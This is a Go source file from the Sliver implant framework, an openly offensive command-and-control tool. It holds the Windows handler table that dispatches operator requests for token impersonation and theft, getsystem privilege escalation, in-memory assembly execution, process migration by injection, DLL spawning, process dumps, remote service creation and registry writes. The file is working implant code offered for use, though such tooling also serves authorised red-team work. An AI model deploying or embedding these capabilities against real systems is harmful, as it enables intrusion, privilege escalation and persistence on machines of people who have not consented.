package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os/exec"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/registry"
	"github.com/bishopfox/sliver/implant/sliver/service"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/golang/protobuf/proto"
	"golang.org/x/sys/windows"
)

var (
	windowsHandlers = map[uint32]RPCHandler{

		// Windows Only
		sliverpb.MsgTaskReq:                  taskHandler,
		sliverpb.MsgProcessDumpReq:           dumpHandler,
		sliverpb.MsgImpersonateReq:           impersonateHandler,
		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
		sliverpb.MsgRunAsReq:                 runAsHandler,
		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
		sliverpb.MsgStartServiceReq:          startService,
		sliverpb.MsgStopServiceReq:           stopService,
		sliverpb.MsgRemoveServiceReq:         removeService,
		sliverpb.MsgEnvReq:                   getEnvHandler,
		sliverpb.MsgSetEnvReq:                setEnvHandler,
		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,

		// Platform specific
		sliverpb.MsgIfconfigReq:          ifconfigHandler,
		sliverpb.MsgScreenshotReq:        screenshotHandler,
		sliverpb.MsgSideloadReq:          sideloadHandler,
		sliverpb.MsgNetstatReq:           netstatHandler,
		sliverpb.MsgMakeTokenReq:         makeTokenHandler,
		sliverpb.MsgPsReq:                psHandler,
		sliverpb.MsgTerminateReq:         terminateHandler,
		sliverpb.MsgRegistryReadReq:      regReadHandler,
		sliverpb.MsgRegistryWriteReq:     regWriteHandler,
		sliverpb.MsgRegistryCreateKeyReq: regCreateKeyHandler,

		// Generic
		sliverpb.MsgPing:        pingHandler,
		sliverpb.MsgLsReq:       dirListHandler,
		sliverpb.MsgDownloadReq: downloadHandler,
		sliverpb.MsgUploadReq:   uploadHandler,
		sliverpb.MsgCdReq:       cdHandler,
		sliverpb.MsgPwdReq:      pwdHandler,
		sliverpb.MsgRmReq:       rmHandler,
		sliverpb.MsgMkdirReq:    mkdirHandler,
		sliverpb.MsgExecuteReq:  executeHandler,
		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}

	windowsPivotHandlers = map[uint32]PivotHandler{
		sliverpb.MsgNamedPipesReq: namedPipeListenerHandler,
	}
)

// GetSystemHandlers - Returns a map of the windows system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// GetSystemPivotHandlers - Returns a map of the windows system handlers
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return windowsPivotHandlers
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &sliverpb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &sliverpb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.Args)
	runAs := &sliverpb.RunAs{
		Output: out,
	}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Config.Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &sliverpb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Config.Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &sliverpb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &sliverpb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process)
	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func executeTokenHandler(data []byte, resp RPCResponse) {
	var (
		err error
	)
	execReq := &sliverpb.ExecuteReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &sliverpb.Execute{}
	cmd := exec.Command(execReq.Path, execReq.Args...)

	// Execute with current token
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(priv.CurrentToken),
	}

	if execReq.Output {
		res, err := cmd.CombinedOutput()
		//{{if .Config.Debug}}
		log.Println(string(res))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		execResp.Result = string(res)
	} else {
		err = cmd.Start()
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &sliverpb.InvokeMigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &sliverpb.Migrate{Success: true}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
		// {{if .Config.Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &sliverpb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Config.Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
	spawnResp := &sliverpb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	namedPipeReq := &sliverpb.NamedPipesReq{}
	err := proto.Unmarshal(envelope.Data, namedPipeReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		namedPipeResp := &sliverpb.NamedPipes{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	err = pivots.StartNamedPipeListener(namedPipeReq.GetPipeName())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error with listener: %s", err.Error())
		// {{end}}
		namedPipeResp := &sliverpb.NamedPipes{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	namedPipeResp := &sliverpb.NamedPipes{
		Success: true,
	}
	data, _ := proto.Marshal(namedPipeResp)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func makeTokenHandler(data []byte, resp RPCResponse) {
	makeTokenReq := &sliverpb.MakeTokenReq{}
	err := proto.Unmarshal(data, makeTokenReq)
	if err != nil {
		return
	}
	makeTokenResp := &sliverpb.MakeToken{}
	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
	if err != nil {
		makeTokenResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(makeTokenResp)
	resp(data, err)
}

func startService(data []byte, resp RPCResponse) {
	startService := &sliverpb.StartServiceReq{}
	err := proto.Unmarshal(data, startService)
	if err != nil {
		return
	}
	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
	startServiceResp := &sliverpb.ServiceInfo{}
	if err != nil {
		startServiceResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(startServiceResp)
	resp(data, err)
}

func stopService(data []byte, resp RPCResponse) {
	stopServiceReq := &sliverpb.StopServiceReq{}
	err := proto.Unmarshal(data, stopServiceReq)
	if err != nil {
		return
	}
	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func removeService(data []byte, resp RPCResponse) {
	removeServiceReq := &sliverpb.RemoveServiceReq{}
	err := proto.Unmarshal(data, removeServiceReq)
	if err != nil {
		return
	}
	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func regWriteHandler(data []byte, resp RPCResponse) {
	regWriteReq := &sliverpb.RegistryWriteReq{}
	err := proto.Unmarshal(data, regWriteReq)
	if err != nil {
		return
	}
	var val interface{}
	switch regWriteReq.Type {
	case sliverpb.RegistryType_BINARY:
		val = regWriteReq.ByteValue
	case sliverpb.RegistryType_DWORD:
		val = regWriteReq.DWordValue
	case sliverpb.RegistryType_QWORD:
		val = regWriteReq.QWordValue
	case sliverpb.RegistryType_STRING:
		val = regWriteReq.StringValue
	default:
		return
	}
	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
	regWriteResp := &sliverpb.RegistryWrite{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regWriteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regWriteResp)
	resp(data, err)
}

func regReadHandler(data []byte, resp RPCResponse) {
	regReadReq := &sliverpb.RegistryReadReq{}
	err := proto.Unmarshal(data, regReadReq)
	if err != nil {
		return
	}
	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
	regReadResp := &sliverpb.RegistryRead{
		Value:    res,
		Response: &commonpb.Response{},
	}
	if err != nil {
		regReadResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regReadResp)
	resp(data, err)
}

func regCreateKeyHandler(data []byte, resp RPCResponse) {
	createReq := &sliverpb.RegistryCreateKeyReq{}
	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}
	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
	createResp := &sliverpb.RegistryCreateKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		createResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(createResp)
	resp(data, err)
}
